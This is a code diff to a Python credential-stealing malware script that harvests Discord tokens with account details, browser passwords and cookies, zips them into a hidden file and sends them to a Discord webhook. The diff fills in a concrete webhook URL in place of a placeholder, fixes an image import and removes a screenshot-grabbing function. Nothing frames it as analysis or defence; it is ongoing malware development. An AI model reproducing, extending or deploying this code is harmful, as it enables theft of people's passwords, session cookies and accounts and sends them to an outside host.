@@ -25,12 +25,12 @@ import wmi
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 from discord import Embed, File, SyncWebhook, Webhook
-import Image
+from PIL import Image 
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = "&WEBHOOK_URL&"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1093274628060872714/NNnvGAbk7L3ypi4bwUIPSK-h9o5LRPY-5VTdWGEzZj-J4uww9O0Q222D6qY1O_6xOdNz"
 
 def main(webhook_url):
 	global webhook, embed
@@ -265,9 +265,7 @@ class grabtokens():
       
 			embed.add_field(name=f"🔷  User: `{username} ({uid})`", value=f"```{token}```\n\n**Email:** `{email}`\n**Phone:** `{phone}`\n**Nitro:** `{nitro}`\n**Methods:** `{methods}`", inline=False)  
 
-def ss():
-	ImageGrab.grab().save("screenshot.png")
-	hide("screenshot.png")
+
 	
 class password():
 	def __init__(self):
@@ -430,7 +428,7 @@ def zipup():
 	with ZipFile(f'files-{os.getenv("UserName")}.zip', 'w') as zipf:
 		zipf.write("google-passwords.txt")
 		zipf.write("google-cookies.txt")
-		zipf.write("screenshot.png")
+		
 	
 	hide(f'files-{os.getenv("UserName")}.zip')
 		
@@ -438,7 +436,6 @@ def cleanup():
 	possible_files = [
      			"google-passwords.txt",
 				"google-cookies.txt",
-				"screenshot.png",
 				f"files-{os.getenv('UserName')}.zip",
     			]
  
